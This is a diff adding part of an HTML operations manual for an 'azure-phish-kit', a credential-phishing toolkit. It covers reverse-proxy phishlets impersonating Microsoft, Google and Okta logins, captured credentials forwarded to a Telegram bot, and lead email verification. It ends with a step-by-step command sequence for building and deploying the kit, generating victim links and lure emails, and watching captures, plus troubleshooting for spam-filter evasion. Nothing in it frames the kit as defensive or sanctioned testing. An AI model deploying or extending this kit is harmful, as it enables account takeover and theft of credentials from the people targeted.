+    <tr><td><code>analytics-srv</code></td><td><code>analytics-server/</code></td><td><code>go build -o analytics-srv .</code></td><td><code>scp analytics-srv ubuntu@&lt;EC2&gt;:...</code></td></tr>
+    <tr><td><code>email-verifier</code></td><td><code>email-verifier/</code></td><td><code>go build -o email-verifier .</code></td><td>Local use only</td></tr>
+    <tr><td>Campaign Mgr Web</td><td><code>campaign-manager/web/</code></td><td><code>go run . --port 9093 --token ...</code></td><td>SSH tunnel preferred</td></tr>
+    <tr><td>Campaign Mgr TUI</td><td><code>campaign-manager/tui/</code></td><td><code>go run .</code></td><td>Run on EC2 via SSH</td></tr>
+  </tbody>
+</table>
+
+<h3>Configuration Files (must be updated per deployment)</h3>
+
+<table>
+  <thead><tr><th>File</th><th>Field(s) to Change</th><th>Command</th></tr></thead>
+  <tbody>
+    <tr><td><code>proxy-server/bootloader.html</code></td><td><code>const _k = '&lt;KEY&gt;'</code></td><td>Paste output of <code>keygen.go</code></td></tr>
+    <tr><td><code>proxy-server/phishlets/microsoft-personal.json</code></td><td><code>hostname</code></td><td>Change to <code>auth.&lt;domain&gt;</code></td></tr>
+    <tr><td><code>proxy-server/phishlets/microsoft.json</code></td><td><code>hostname</code></td><td>Change to <code>auth.&lt;domain&gt;</code></td></tr>
+    <tr><td><code>proxy-server/phishlets/google.json</code></td><td><code>hostname</code></td><td>Change to <code>accounts.&lt;domain&gt;</code></td></tr>
+    <tr><td><code>proxy-server/phishlets/okta.json</code></td><td><code>hostname</code></td><td>Change to <code>idp.&lt;domain&gt;</code></td></tr>
+    <tr><td><code>cdn-config/wrangler.toml</code></td><td><code>zone_name</code>, route <code>pattern</code>s</td><td>Change to your domain</td></tr>
+    <tr><td><code>cdn-config/ORIGIN_URL</code> (secret)</td><td>EC2 origin URL</td><td><code>npx wrangler secret put ORIGIN_URL</code></td></tr>
+  </tbody>
+</table>
+
+<h3>Environment Variables</h3>
+
+<table>
+  <thead><tr><th>Variable</th><th>Used By</th><th>Required</th><th>Example</th></tr></thead>
+  <tbody>
+    <tr><td><code>TELEGRAM_BOT_TOKEN</code></td><td>proxy-server</td><td>Yes (for captures)</td><td><code>8576202311:AA...</code></td></tr>
+    <tr><td><code>TELEGRAM_CHAT_ID</code></td><td>proxy-server</td><td>Yes (for captures)</td><td><code>5361206216</code></td></tr>
+    <tr><td><code>PHISHING_HOST</code></td><td>proxy-server</td><td>Yes</td><td><code>auth.glnt.cc</code></td></tr>
+    <tr><td><code>PORT</code></td><td>proxy-server</td><td>No (default 9091)</td><td><code>9091</code></td></tr>
+    <tr><td><code>ALLOWED_IPS</code></td><td>campaign-manager/web</td><td>No</td><td><code>10.0.0.0/8,172.16.0.0/12</code></td></tr>
+    <tr><td><code>MAX_AGE_HOURS</code></td><td>analytics-server</td><td>No (auto-purge)</td><td><code>72</code></td></tr>
+    <tr><td><code>EVENTS_PATH</code></td><td>campaign-manager/web</td><td>No</td><td><code>../data/captures.jsonl</code></td></tr>
+  </tbody>
+</table>
+
+<h2>Quick Reference</h2>
+
+<h3>Generate &amp; Deploy (top-to-bottom)</h3>
+
+<pre><code># 1. Generate key
+cd payload-generator &amp;&amp; go run keygen.go
+# Copy the 44-character base64 key
+
+# 2. Set key in bootloader.html
+# Edit proxy-server/bootloader.html: const _k = '&lt;KEY&gt;';
+
+# 3. Update phishlet hostnames in proxy-server/phishlets/*.json
+# Change "hostname" to your domain subdomains
+
+# 4. Build proxy for Linux
+cd proxy-server &amp;&amp; GOOS=linux GOARCH=amd64 go build -o proxy-srv .
+
+# 5. Deploy to EC2
+scp proxy-srv ubuntu@&lt;EC2-IP&gt;:~/azure-phish-kit/proxy-server/
+ssh ubuntu@&lt;EC2-IP&gt; "sudo systemctl restart phish-proxy"
+
+# 6. Deploy Cloudflare Worker
+cd cdn-config &amp;&amp; npx wrangler deploy
+
+# 7. Generate campaign link
+cd payload-generator
+go run . --key &lt;KEY&gt; --email victim@company.com \
+  --redirect "https://login.microsoftonline.com/common/oauth2/authorize?client_id=CLIENT_ID&amp;redirect_uri=https://auth.your-domain.com&amp;response_type=code&amp;prompt=login" \
+  --campaign q4-campaign-001
+# Copy the fragment → CURRENT_LINK.txt
+
+# 8. Build campaign email
+cd scripts
+./build-campaign-email.sh shared-document "https://auth.your-domain.com/#&lt;fragment&gt;" "John" email.html
+
+# 9. Verify leads before sending
+cd email-verifier
+./email-verifier --input ../data/leads/target_company.csv --output ../data/leads/target_verified.csv
+
+# 10. View captures live
+ssh ubuntu@&lt;EC2-IP&gt; "tail -f ~/azure-phish-kit/data/captures.jsonl"
+
+# 11. Open analytics
+open http://&lt;EC2-IP&gt;:9092/?token=&lt;TOKEN&gt;</code></pre>
+
+<h3>Troubleshooting</h3>
+
+<table>
+  <thead><tr><th>Symptom</th><th>Check</th></tr></thead>
+  <tbody>
+    <tr><td>"Cannot verify link"</td><td>AES key mismatch between payload-generator and bootloader.html</td></tr>
+    <tr><td>404 on <code>/login</code></td><td>Work-only Microsoft account &mdash; personal accounts redirect to office.com (use microsoft-personal)</td></tr>
+    <tr><td>SSL errors in browser console</td><td><code>hostname</code> field in phishlet JSON must match the actual subdomain</td></tr>
+    <tr><td>Worker returns 502</td><td>EC2 security group blocking Cloudflare IPs</td></tr>
+    <tr><td>Worker returns 1003</td><td><code>ORIGIN_URL</code> secret not set or wrong format (must include <code>http://</code> prefix)</td></tr>
+    <tr><td>Telegram not receiving</td><td><code>TELEGRAM_BOT_TOKEN</code> and <code>TELEGRAM_CHAT_ID</code> must be set as env vars before proxy start</td></tr>
+    <tr><td>Rate limited (429)</td><td>Token-bucket: wait 60 seconds or use different IP</td></tr>
+    <tr><td>Bootloader spinner forever</td><td>JavaScript error &mdash; check browser console for decrypt errors</td></tr>
+    <tr><td>Emails landing in spam</td><td>Run through mail-tester.com &mdash; score below 9 means fix SPF/DKIM/DMARC on sender domain</td></tr>
+    <tr><td>SuperMailer SMTP auth fails</td><td>Verify port 587, STARTTLS, check credentials, ensure IP not blocked by SMTP relay</td></tr>
+    <tr><td>Bounce rate &gt;5% during campaign</td><td>Pause immediately &mdash; investigate invalid addresses or sender reputation blacklisting</td></tr>
+    <tr><td>High opens, zero captures</td><td>Bootloader or proxy may be down &mdash; verify with <code>curl -I https://auth.&lt;domain&gt;/</code></td></tr>
+    <tr><td>TUI raw mode not restoring</td><td><code>reset</code> or <code>stty sane</code></td></tr>
+    <tr><td>Link generation fails (wrong key size)</td><td>Key must be exactly 44 base64 characters (decodes to 32 bytes) &mdash; use <code>keygen.go</code></td></tr>
+    <tr><td>0 lures loaded in Campaign Manager</td><td><code>--lures</code> path must point to directory with <code>.html</code> files</td></tr>
+    <tr><td>0 phishlets loaded in Campaign Manager</td><td><code>--phishlets</code> path must point to directory with valid <code>.json</code> phishlet configs</td></tr>
+  </tbody>
+</table>
+
+<div class="footer">
+  <span>FM-000 &middot; STRASSER &#x271B; LAB</span>
+  <span>June 2026</span>
+</div>
+
+</div>
+</body>
+</html>
